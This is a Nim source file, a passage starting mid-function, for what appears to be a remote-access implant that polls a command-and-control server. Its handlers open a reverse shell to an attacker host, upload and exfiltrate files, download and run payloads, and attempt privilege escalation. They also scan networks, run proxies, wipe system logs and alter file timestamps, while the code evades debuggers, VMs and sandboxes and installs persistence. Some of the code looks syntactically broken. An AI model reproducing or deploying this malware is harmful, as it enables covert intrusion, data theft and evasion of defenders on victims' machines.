    discard execCmdEx("systemctl disable system-maintenance")
    discard execCmdEx("crontab -r")
    removeFile("/etc/systemd/system/system-maintenance.service")
  quit(0)

proc captureNetworkConfig(ctx: AsyncEvent, lazyconf: LazyDataType) {.async.} =
  try:
    var cmd: string
    if getAppFilename().toLowerAscii().contains("windows"):
      cmd = "ipconfig /all"
    else:
      cmd = "ifconfig || ip addr"
    let shellCommand = getShellCommand("-c")
    let (output, errCode) = execCmdEx(shellCommand.join(" ") & " " & cmd)
    if errCode != 0:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Failed to capture network config: {output}"
      return
    let tempFile = if getAppFilename().toLowerAscii().contains("windows"): getTempDir() / "netconfig.txt" else: "/tmp/netconfig.txt"
    writeFile(tempFile, output)
    await uploadFile(ctx, tempFile)
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Network configuration captured and uploaded"
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to capture network config: {getCurrentExceptionMsg()}"

proc encryptPacket(ctx: ref PacketEncryptionContext, packet: seq[byte]): seq[byte] =
  # Requires nimcrypto or similar library
  let aes = initAES(ctx.AesKey.Key)
  var iv = newSeq[byte](16)
  discard randomBytes(iv)
  var encryptedData = newSeq[byte](16 + packet.len)
  copyMem(encryptedData[0].addr, iv[0].addr, 16)
  aes.encryptCFB(packet, encryptedData[16..^1], iv)
  result = encryptedData

proc sendShell(ip: string, port: int) {.async.} =
  try:
    let target = fmt"{ip}:{port}"
    let con = newAsyncSocket()
    await con.connect(parseIpAddress(ip), Port(port))
    defer: con.close()

    let shellCommand = getShellCommand("-i")
    let cmd = startProcess(shellCommand.join(" "), stdin = con, stdout = con, stderr = con)
    await cmd.wait()
  except:
    echo fmt"[ERROR] Error connecting to {ip}:{port}: {getCurrentExceptionMsg()}"

proc decryptPacket(ctx: ref PacketEncryptionContext, encryptedData: seq[byte]): seq[byte] =
  if encryptedData.len < 16:
    raise newException(ValueError, "encrypted data too short")
  let iv = encryptedData[0..<16]
  let data = encryptedData[16..^1]
  let aes = initAES(ctx.AesKey.Key)
  var decryptedData = newSeq[byte](data.len)
  aes.decryptCFB(data, decryptedData, iv)
  result = decryptedData

proc sendRequest(ctx: AsyncEvent, url, method, body, filePath: string): Future[AsyncHttpClient] {.async.} =
  let client = newAsyncHttpClient(sslContext = newContext(verifyMode = CVerifyNone), timeout = 30000)
  defer: client.close()

  var headers = newHttpHeaders(HEADERS)
  headers["User-Agent"] = USER_AGENTS[rand(USER_AGENTS.len - 1)]

  if filePath != "":
    let fileData = readFile(filePath)
    let mp = newMultipartData()
    mp.addFiles({"file": (filePath.extractFilename(), fileData)})
    headers["Content-Type"] = mp.getContentType()
    let resp = await client.request(url, method, body = mp.getBody(), headers = headers)
    return resp
  else:
    let encryptedBody = encryptPacket(encryptionCtx, body.toBytes())
    let base64Body = encode(encryptedBody)
    headers["Content-Type"] = "text/plain"
    let resp = await client.request(url, method, body = base64Body, headers = headers)
    if resp.status == $Http200:
      let rawResponse = await resp.body
      let encryptedResponse = decode(rawResponse)
      let decryptedResponse = decryptPacket(encryptionCtx, encryptedResponse.toBytes())
      resp.body = decryptedResponse.toString()
    return resp

proc retryRequest(ctx: AsyncEvent, url, method, body, filePath: string): Future[AsyncHttpClient] {.async.} =
  for i in 0..<MAX_RETRIES:
    try:
      let resp = await sendRequest(ctx, url, method, body, filePath)
      if resp.status == $Http200:
        return resp
      echo fmt"[RETRY] Attempt {i+1}/{MAX_RETRIES}: {resp.status}"
    except:
      echo fmt"[RETRY] Attempt {i+1}/{MAX_RETRIES}: {getCurrentExceptionMsg()}"
    await sleepAsync(SLEEP)
  raise newException(Exception, "max retries reached")

proc executeCommandWithRetry(shellCommand: seq[string], command: string): tuple[output: string, err: bool] =
  for i in 0..<MAX_RETRIES:
    let (output, errCode) = execCmdEx(shellCommand.join(" ") & " " & command)
    if errCode == 0:
      return (output, false)
    echo fmt"[CMD RETRY] Attempt {i+1}/{MAX_RETRIES}: {output}"
    sleep(2000)
  result = ("", true)

proc getShellCommand(interactive: string): seq[string] =
  case getAppFilename().toLowerAscii():
  of "windows":
    if findExe("powershell") != "":
      result = @["powershell", "-Command"]
    else:
      result = @["cmd", "/C"]
  of "linux", "darwin":
    if findExe("bash") != "":
      result = @["bash", interactive]
    else:
      result = @["sh", "-c"]
  else:
    result = @["sh", "-c"]

proc calculateJitteredSleep(baseSleep: int, minJitterPercentage, maxJitterPercentage: float): int =
  let jitterPercentage = minJitterPercentage + rand(maxJitterPercentage - minJitterPercentage)
  let jitterRange = int(float(baseSleep) * jitterPercentage)
  let jitter = rand(jitterRange)
  result = baseSleep + jitter

proc main() {.async.} =
  try:
    randomize()
    let baseSleepTime = SLEEP
    let minJitterPercentage = 0.1
    let maxJitterPercentage = 0.3
    let keyHex = "{key}"
    var lazyconf: LazyDataType
    var currentPortScanResults: Table[string, seq[int]]
    let url = C2_URL & "/config.json"

    if not readJsonFromUrl(url, lazyconf):
      echo "[ERROR] Failed to read JSON config"
      return

    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Reading JSON from URL: {url}"

    initStealthMode(lazyconf)
    encryptionCtx = initEncryptionContext(keyHex)
    if encryptionCtx == nil:
      if lazyconf.DebugImplant == "True":
        echo "[FATAL] Failed to initialize encryption"
      await sleepAsync(30000)
      restartClient()

    let shellCommand = getShellCommand("-c")
    let baseCtx = newAsyncEvent()
    discard ensurePersistence(lazyconf)

    while true:
      try:
        let ctx = newAsyncEvent()
        let resp = await retryRequest(ctx, C2_URL & MALEABLE & CLIENT_ID, "GET", "", "")
        let body = await resp.body
        let command = body.strip()
        if command == "":
          continue

        handleStealthCommand(command, lazyconf)
        if stealthModeEnabled:
          if lazyconf.DebugImplant == "True":
            echo "[DEBUG] Stealth mode is active. Skipping activity."
          continue

        if lazyconf.DebugImplant == "True":
          echo "[INFO] Simulation Started..."
        asyncCheck simulateLegitimateTraffic(lazyconf)

        if lazyconf.DebugImplant == "True":
          echo "[INFO] Execution Simulation."

        if checkDebuggers(lazyconf):
          if lazyconf.DebugImplant == "True":
            echo "[INFO] We are under debugger"
        else:
          if lazyconf.DebugImplant == "True":
            echo "[INFO] We aren't under debugger."

        if isVMByMAC():
          if lazyconf.DebugImplant == "True":
            echo "[INFO] This is a VM"
        else:
          if lazyconf.DebugImplant == "True":
            echo "[INFO] This is not a VM"

        if isSandboxEnvironment(lazyconf):
          if lazyconf.DebugImplant == "True":
            echo "[INFO] This is a sandbox environment"
        else:
          if lazyconf.DebugImplant == "True":
            echo "[INFO] This is not a sandbox environment"

        if not command.contains("stealth"):
          case command:
          of "download:" & _:
            handleDownload(ctx, command)
          of "upload:" & _:
            handleUpload(ctx, command)
          of "rev:" & _:
            asyncCheck sendShell(LHOST, lazyconf.ReverseShellPort)
          of "exfil:" & _:
            asyncCheck handleExfiltrate(ctx, command, lazyconf)
          of "download_exec:" & let url:
            asyncCheck downloadAndExecute(ctx, url, lazyconf)
          of "obfuscate:" & let filePath:
            if filePath == "":
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Invalid obfuscate command format, expected obfuscate:<file_path>"
            if not obfuscateFileTimestamps(lazyconf, filePath):
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Failed to obfuscate timestamps"
          of "cleanlogs:" & _:
            if not cleanSystemLogs(lazyconf):
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Failed to clean system logs"
          of "discover:" & _:
            discoverLocalHosts(lazyconf)
          of "adversary:" & _:
            if not handleAdversary(ctx, command, lazyconf, currentPortScanResults):
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Failed to handle adversary command"
          of "softenum:" & _:
            let soft = getUsefulSoftware()
            if lazyconf.DebugImplant == "True":
              echo "[INFO] Useful software found:"
              for s in soft:
                if s != "":
                  echo " - ", s
          of "netconfig:" & _:
            asyncCheck captureNetworkConfig(ctx, lazyconf)
          of "escalatelin:" & _:
            asyncCheck tryPrivilegeEscalation(lazyconf)
          of "proxy:" & let parts:
            let p = parts.split(":")
            if p.len != 4:
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Invalid proxy command format, expected proxy:<listenIP>:<listenPort>:<targetIP>:<targetPort>"
              asyncCheck retryRequest(ctx, C2_URL & MALEABLE & CLIENT_ID, "POST", """{"error":"Invalid proxy command format"}""", "")
            else:
              let listenAddr = p[0] & ":" & p[1]
              let targetAddr = p[2] & ":" & p[3]
              asyncCheck startProxy(lazyconf, listenAddr, targetAddr)
          of "stop_proxy:" & let listenAddr:
            if listenAddr == "":
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Invalid stop_proxy command format, expected stop_proxy:<listenAddr>"
            if not stopProxy(listenAddr, lazyconf):
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Failed to stop proxy"
          of "portscan:" & _:
            let timeout = 2000
            currentPortScanResults = portScanner(discoveredLiveHosts & ", " & lazyconf.Rhost, lazyconf.Ports, timeout)
            results_portscan = currentPortScanResults
            for ip, openPorts in currentPortScanResults:
              if openPorts.len > 0:
                if lazyconf.DebugImplant == "True":
                  echo fmt"IP {ip} has open ports: {openPorts}"
              else:
                if lazyconf.DebugImplant == "True":
                  echo fmt"IP {ip} has no open ports"
          of "compressdir:" & let inputDir:
            if inputDir == "":
              if lazyconf.DebugImplant == "True":
                echo "[ERROR] Invalid compressdir command format, expected compressdir:<directory_path>"
            let dirName = inputDir.extractFilename()
            let currentTime = now().format("yyyyMMdd")
            let outputFileName = fmt"{dirName}_{CLIENT_ID}_{currentTime}.tar.gz"
            let outputFilePath = inputDir.parentDir() / outputFileName
            if not dirExists(inputDir):
              if lazyconf.DebugImplant == "True":
                echo fmt"[ERROR] Directory not found: {inputDir}"
            elif not await compressGzipDir(ctx, inputDir, outputFilePath, lazyconf):
              if lazyconf.DebugImplant == "True":
                echo fmt"[ERROR] Failed to compress directory '{inputDir}'"
            else:
              if lazyconf.DebugImplant == "True":
                echo fmt"[INFO] Successfully compressed directory to: {outputFilePath}"
          of "terminate:" & _:
            if lazyconf.DebugImplant == "True":
              echo "[INFO] terminate command"
            selfDestruct(lazyconf)
          else:
            handleCommand(ctx, command, shellCommand, lazyconf, currentPortScanResults)
      except:
        echo fmt"[RECOVER] Error in main loop: {getCurrentExceptionMsg()}"
      let sleepTime = calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
      await sleepAsync(sleepTime)
  except:
    globalRecover()

proc handleDownload(ctx: AsyncEvent, command: string) {.async.} =
  try:
    let filePath = command.replace("download:", "")
    let fileURL = C2_URL & MALEABLE & "/download/" & filePath
    let resp = await retryRequest(ctx, fileURL, "GET", "", "")
    let fileData = await resp.body
    writeFile(filePath.extractFilename(), fileData)
  except:
    echo fmt"[ERROR] Download failed: {getCurrentExceptionMsg()}"

proc handleUpload(ctx: AsyncEvent, command: string) {.async.} =
  try:
    let filePath = command.replace("upload:", "")
    let resp = await retryRequest(ctx, C2_URL & MALEABLE & "/upload", "POST", "", filePath)
    if resp.status != $Http200:
      echo fmt"[ERROR] Upload failed with status: {resp.status}"
  except:
    echo fmt"[ERROR] Upload failed: {getCurrentExceptionMsg()}"

proc handleCommand(ctx: AsyncEvent, command: string, shellCommand: seq[string], lazyconf: LazyDataType, resultadosEscaneo: Table[string, seq[int]]) {.async.} =
  try:
    let (output, err) = executeCommandWithRetry(shellCommand, command)
    let pid = getCurrentProcessId()
    let hostname = getHostname()
    let ips = getIPs()
    let currentUser = getCurrentUser()
    let jsonData = %*{
      "output": if err: fmt"Command execution error: {output}" else: output,
      "client": getAppFilename().toLowerAscii(),
      "command": command,
      "pid": $pid,
      "hostname": hostname,
      "ips": ips.join(", "),
      "user": currentUser,
      "discovered_ips": discoveredLiveHosts,
      "result_portscan": resultadosEscaneo
    }
    if lazyconf.DebugImplant == "True":
      echo "[INFO] JSON Data (Formatted):"
      echo $jsonData
    await retryRequest(ctx, C2_URL & MALEABLE & CLIENT_ID, "POST", $jsonData, "")
  except:
    echo fmt"[RECOVER] Error in handleCommand: {getCurrentExceptionMsg()}"

proc getIPs(): seq[string] =
  var ips: seq[string]
  for iface in getNetworkInterfaces():
    for addr in iface.addrs:
      if addr.family == IPv4 and not addr.isLoopback():
        ips.add(addr.`$`)
  if GlobalIP == "":
    GlobalIP = getGlobalIP()
    ips.add(GlobalIP)
  result = ips

when isMainModule:
  waitFor main()